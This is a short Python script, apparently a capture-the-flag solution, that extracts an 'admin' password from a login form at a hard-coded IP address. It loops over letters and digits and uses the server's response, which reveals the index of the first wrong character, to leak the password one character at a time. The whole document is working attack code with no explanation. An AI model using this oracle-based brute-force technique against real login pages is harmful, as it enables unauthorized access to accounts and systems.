import requests
import string

pool_of_characters = string.ascii_letters + string.digits
leaked = []
count = 0

url = "http://64.227.11.108/web_five_id7wr5Mi/index.php"

while len(leaked)!=8:
  for char in pool_of_characters:
    trying = "".join(leaked)+char
    response = requests.post(url,data ={"uname":"admin","password":trying.ljust(8,'0')})
    if b'index '+ str(len(leaked)).encode() not in response.content:
      leaked.append(char)
      break
  
  print("".join(leaked))
